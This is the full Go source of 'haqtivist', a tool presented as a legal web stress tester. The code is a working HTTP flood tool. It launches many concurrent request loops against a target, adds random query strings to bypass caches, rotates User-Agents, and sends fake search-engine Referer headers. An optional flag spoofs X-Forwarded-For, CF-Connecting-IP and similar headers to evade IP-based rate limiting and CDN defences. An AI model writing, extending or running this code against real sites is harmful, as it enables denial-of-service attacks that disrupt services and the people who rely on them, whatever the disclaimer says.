package main

/*
 haqtivist - Web Stress Testing Tool
 
 Modified and improved for legitimate security testing

 Legal use only: Test your own websites or with explicit permission!
*/

import (
	"context"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const __version__ = "1.0.0"

const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk              uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool = false
	verbose         bool = false
	duration        int  = 0
	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.bing.com/search?q=",
		"http://www.yahoo.com/search?q=",
		"http://www.facebook.com/search?q=",
		"http://www.twitter.com/search?q=",
		"http://www.linkedin.com/search?q=",
	}
	headersUseragents []string = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
		"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	}
	cur        int32
	statsMutex sync.Mutex
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

type AttackStats struct {
	TotalSent     int64
	TotalErrors   int64
	TotalSuccess  int64
	StartTime     time.Time
	ActiveThreads int32
	MinResponse   int64
	MaxResponse   int64
	TotalResponse int64
}

var stats AttackStats

func main() {
	var (
		version    bool
		target     string
		agents     string
		data       string
		method     string
		headers    arrayFlags
		maxproc    int
		timeout    int
		delay      int
		randomIP   bool
	)

	flag.BoolVar(&version, "version", false, "Print version and exit")
	flag.BoolVar(&safe, "safe", false, "Auto stop when server returns 500 errors")
	flag.BoolVar(&verbose, "verbose", false, "Show detailed output")
	flag.BoolVar(&randomIP, "random-ip", false, "Generate random X-Forwarded-For headers")
	flag.StringVar(&target, "target", "http://localhost", "Target URL (required)")
	flag.StringVar(&agents, "agents", "", "File containing User-Agent list (one per line)")
	flag.StringVar(&data, "data", "", "POST/PUT data (enables POST requests)")
	flag.StringVar(&method, "method", "GET", "HTTP method (GET, POST, PUT, DELETE, HEAD, OPTIONS)")
	flag.IntVar(&maxproc, "threads", 100, "Maximum concurrent threads/goroutines")
	flag.IntVar(&duration, "duration", 0, "Attack duration in seconds (0 = unlimited)")
	flag.IntVar(&timeout, "timeout", 30, "HTTP request timeout in seconds")
	flag.IntVar(&delay, "delay", 0, "Delay between requests in milliseconds (0 = no delay)")
	flag.Var(&headers, "header", "Add custom headers (can be used multiple times)")
	flag.Parse()

	// Display banner
	printBanner()

	// Validate target
	if target == "http://localhost" && !version {
		fmt.Println("⚠️  Warning: No target specified. Use -target flag.")
		fmt.Println("Example: haqtivist -target https://yoursite.com -threads 50 -duration 30")
		flag.Usage()
		os.Exit(1)
	}

	// Set environment
	os.Setenv("HAQTIVIST_THREADS", strconv.Itoa(maxproc))

	// Parse and validate URL
	u, err := url.Parse(target)
	if err != nil {
		fmt.Printf("❌ Error parsing URL: %v\n", err)
		os.Exit(1)
	}

	if version {
		fmt.Printf("haqtivist v%s - Web Stress Testing Tool\n", __version__)
		fmt.Println("Legal use only. Test only your own websites!")
		os.Exit(0)
	}

	// Load User-Agents from file
	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, strings.TrimSpace(a))
			}
			fmt.Printf("📋 Loaded %d User-Agents from %s\n", len(headersUseragents), agents)
		} else {
			fmt.Printf("❌ Cannot load User-Agent list from %s: %v\n", agents, err)
			os.Exit(1)
		}
	}

	// Initialize stats
	stats.StartTime = time.Now()
	stats.MinResponse = 9999999
	stats.MaxResponse = 0

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Context for duration limit
	ctx, cancel := context.WithCancel(context.Background())
	if duration > 0 {
		fmt.Printf("⏱️  Test will run for %d seconds\n", duration)
		go func() {
			time.Sleep(time.Duration(duration) * time.Second)
			fmt.Println("\n\n⏰ Time limit reached, stopping test...")
			cancel()
		}()
	}

	// Start attack
	fmt.Println("\n🚀 Starting stress test...")
	fmt.Println(strings.Repeat("=", 70))
	go runAttack(target, u.Host, data, method, headers, delay, randomIP, ctx)

	// Progress reporter
	go reportProgress()

	// Wait for interrupt or completion
	select {
	case <-sigChan:
		fmt.Println("\n\n🛑 Test interrupted by user")
		cancel()
	case <-ctx.Done():
		// Test finished or timed out
	}

	// Wait for goroutines to finish
	time.Sleep(2 * time.Second)
	printFinalStats()
	fmt.Println("\n✅ Test completed")
}

func runAttack(urlStr, host, postData, method string, headers arrayFlags, delayMs int, randomIP bool, ctx context.Context) {
	ss := make(chan uint8, 100)
	
	fmt.Printf("\n📊 Test Configuration:\n")
	fmt.Printf("   Target: %s\n", urlStr)
	fmt.Printf("   Method: %s\n", method)
	fmt.Printf("   Threads: %d\n", getMaxThreads())
	fmt.Printf("   Safe Mode: %v\n", safe)
	fmt.Printf("   Random IP: %v\n", randomIP)
	fmt.Printf("   Delay: %dms\n", delayMs)
	fmt.Printf("   Verbose: %v\n\n", verbose)
	
	fmt.Println("Active | Requests | Success | Errors | Status")
	fmt.Println("-------|----------|---------|--------|-------")

	for {
		select {
		case <-ctx.Done():
			close(ss)
			return
		default:
			if atomic.LoadInt32(&cur) < int32(getMaxThreads()) {
				go httpRequest(urlStr, host, postData, method, headers, delayMs, randomIP, ss)
			}
			
			// Process results
			select {
			case result := <-ss:
				switch result {
				case callExitOnErr:
					atomic.AddInt32(&cur, -1)
					atomic.AddInt64(&stats.TotalErrors, 1)
				case callExitOnTooManyFiles:
					atomic.AddInt32(&cur, -1)
					atomic.AddInt64(&stats.TotalErrors, 1)
					setMaxThreads(getMaxThreads() - 1)
				case callGotOk:
					atomic.AddInt64(&stats.TotalSuccess, 1)
					atomic.AddInt64(&stats.TotalSent, 1)
				case targetComplete:
					atomic.AddInt64(&stats.TotalSuccess, 1)
					atomic.AddInt64(&stats.TotalSent, 1)
					fmt.Println("\n\n🎯 Target reached limit threshold")
					return
				}
			default:
				time.Sleep(10 * time.Millisecond)
			}
		}
	}
}

func httpRequest(urlStr, host, postData, method string, headers arrayFlags, delayMs int, randomIP bool, s chan uint8) {
	atomic.AddInt32(&cur, 1)
	atomic.AddInt32(&stats.ActiveThreads, 1)
	defer atomic.AddInt32(&stats.ActiveThreads, -1)

	var paramJoiner string
	if strings.ContainsRune(urlStr, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     90 * time.Second,
			DisableCompression:  false,
			DisableKeepAlives:   false,
		},
	}

	// Add delay if specified
	if delayMs > 0 {
		time.Sleep(time.Duration(delayMs) * time.Millisecond)
	}

	// Build random query parameter to bypass cache
	randomParam := buildRandomString(rand.Intn(15)+5) + "=" + buildRandomString(rand.Intn(15)+5)
	fullURL := urlStr + paramJoiner + randomParam

	var req *http.Request
	var err error

	switch strings.ToUpper(method) {
	case "POST":
		if postData != "" {
			req, err = http.NewRequest("POST", urlStr, strings.NewReader(postData))
		} else {
			postData = buildRandomString(rand.Intn(200) + 50)
			req, err = http.NewRequest("POST", urlStr, strings.NewReader(postData))
		}
	case "PUT":
		if postData != "" {
			req, err = http.NewRequest("PUT", urlStr, strings.NewReader(postData))
		} else {
			postData = buildRandomString(rand.Intn(200) + 50)
			req, err = http.NewRequest("PUT", urlStr, strings.NewReader(postData))
		}
	case "DELETE":
		req, err = http.NewRequest("DELETE", fullURL, nil)
	case "HEAD":
		req, err = http.NewRequest("HEAD", fullURL, nil)
	case "OPTIONS":
		req, err = http.NewRequest("OPTIONS", fullURL, nil)
	default:
		req, err = http.NewRequest("GET", fullURL, nil)
	}

	if err != nil {
		if verbose {
			fmt.Printf("❌ Request creation error: %v\n", err)
		}
		s <- callExitOnErr
		return
	}

	// Set headers
	req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Expires", "0")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildRandomString(rand.Intn(10)+5))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", host)
	
	if randomIP {
		req.Header.Set("X-Forwarded-For", generateRandomIP())
		req.Header.Set("X-Real-IP", generateRandomIP())
		req.Header.Set("CF-Connecting-IP", generateRandomIP())
		req.Header.Set("True-Client-IP", generateRandomIP())
	}

	// Add custom headers
	for _, element := range headers {
		words := strings.SplitN(element, ":", 2)
		if len(words) == 2 {
			req.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}
	}

	// Execute request with timing
	startTime := time.Now()
	resp, err := client.Do(req)
	responseTime := time.Since(startTime).Milliseconds()

	if err != nil {
		if verbose {
			fmt.Printf("❌ Request error: %v\n", err)
		}
		if strings.Contains(err.Error(), "socket: too many open files") {
			s <- callExitOnTooManyFiles
			return
		}
		s <- callExitOnErr
		return
	}
	defer resp.Body.Close()

	// Update response time stats
	atomic.AddInt64(&stats.TotalResponse, responseTime)
	
	// Update min/max response times
	for {
		min := atomic.LoadInt64(&stats.MinResponse)
		if responseTime >= min || atomic.CompareAndSwapInt64(&stats.MinResponse, min, responseTime) {
			break
		}
	}
	for {
		max := atomic.LoadInt64(&stats.MaxResponse)
		if responseTime <= max || atomic.CompareAndSwapInt64(&stats.MaxResponse, max, responseTime) {
			break
		}
	}

	// Read and discard body
	io.Copy(ioutil.Discard, resp.Body)

	if verbose {
		fmt.Printf("📡 %s %s -> Status: %d (Time: %dms)\n", method, fullURL, resp.StatusCode, responseTime)
	}

	if safe && resp.StatusCode >= 500 {
		fmt.Printf("\n⚠️  Server returned %d, stopping test\n", resp.StatusCode)
		s <- targetComplete
		return
	}

	s <- callGotOk
}

func buildRandomString(size int) string {
	var a []rune
	for i := 0; i < size; i++ {
		charType := rand.Intn(3)
		switch charType {
		case 0:
			a = append(a, rune(rand.Intn(26)+65))
		case 1:
			a = append(a, rune(rand.Intn(26)+97))
		case 2:
			a = append(a, rune(rand.Intn(10)+48))
		}
	}
	return string(a)
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", 
		rand.Intn(255), 
		rand.Intn(255), 
		rand.Intn(255), 
		rand.Intn(255))
}

func reportProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		active := atomic.LoadInt32(&cur)
		total := atomic.LoadInt64(&stats.TotalSent)
		success := atomic.LoadInt64(&stats.TotalSuccess)
		errors := atomic.LoadInt64(&stats.TotalErrors)
		
		fmt.Printf("\r%6d | %8d | %7d | %6d | Running", active, total, success, errors)
		
		if verbose {
			elapsed := time.Since(stats.StartTime)
			if elapsed.Seconds() > 0 {
				rps := float64(total) / elapsed.Seconds()
				fmt.Printf(" (%.2f req/sec)", rps)
			}
		}
	}
}

func printFinalStats() {
	fmt.Println("\n\n" + strings.Repeat("=", 70))
	fmt.Println("📊 FINAL TEST STATISTICS")
	fmt.Println(strings.Repeat("=", 70))
	
	elapsed := time.Since(stats.StartTime)
	total := atomic.LoadInt64(&stats.TotalSent)
	success := atomic.LoadInt64(&stats.TotalSuccess)
	errors := atomic.LoadInt64(&stats.TotalErrors)
	avgResponse := int64(0)
	
	if total > 0 {
		avgResponse = atomic.LoadInt64(&stats.TotalResponse) / total
	}
	
	fmt.Printf("\n⏱️  Test Duration:     %.2f seconds\n", elapsed.Seconds())
	fmt.Printf("📨 Total Requests:   %d\n", total)
	fmt.Printf("✅ Successful:       %d\n", success)
	fmt.Printf("❌ Errors:           %d\n", errors)
	
	if total > 0 {
		fmt.Printf("📈 Success Rate:      %.2f%%\n", float64(success)/float64(total)*100)
		fmt.Printf("📊 Requests/Second:   %.2f\n", float64(total)/elapsed.Seconds())
	}
	
	if success > 0 {
		fmt.Printf("\n⏱️  Response Time Stats:\n")
		fmt.Printf("   Average: %dms\n", avgResponse)
		fmt.Printf("   Minimum: %dms\n", atomic.LoadInt64(&stats.MinResponse))
		fmt.Printf("   Maximum: %dms\n", atomic.LoadInt64(&stats.MaxResponse))
	}
	
	// Performance assessment
	fmt.Printf("\n📋 Assessment:\n")
	if total > 0 {
		successRate := float64(success) / float64(total) * 100
		if successRate >= 99 {
			fmt.Println("   ✅ Server handled the load well")
		} else if successRate >= 95 {
			fmt.Println("   ⚠️  Server showed some strain")
		} else {
			fmt.Println("   ❌ Server struggled under load")
		}
	}
}

func printBanner() {
	banner := `
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██╗  ██╗ █████╗  ██████╗ ████████╗██╗██╗   ██╗██╗███████╗████████╗
║   ██║  ██║██╔══██╗██╔═══██╗╚══██╔══╝██║██║   ██║██║██╔════╝╚══██╔══╝
║   ███████║███████║██║   ██║   ██║   ██║██║   ██║██║███████╗   ██║   
║   ██╔══██║██╔══██║██║▄▄ ██║   ██║   ██║╚██╗ ██╔╝██║╚════██║   ██║   
║   ██║  ██║██║  ██║╚██████╔╝   ██║   ██║ ╚████╔╝ ██║███████║   ██║   
║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝    ╚═╝   ╚═╝  ╚═══╝  ╚═╝╚══════╝   ╚═╝   
║                                                                  ║
║           Web Stress Testing Tool - Legal Use Only               ║
╚══════════════════════════════════════════════════════════════════╝
`
	fmt.Println(banner)
	fmt.Printf("Version: %s\n\n", __version__)
}

func getMaxThreads() int {
	t := os.Getenv("HAQTIVIST_THREADS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		return 100
	}
	return maxproc
}

func setMaxThreads(n int) {
	os.Setenv("HAQTIVIST_THREADS", strconv.Itoa(n))
}
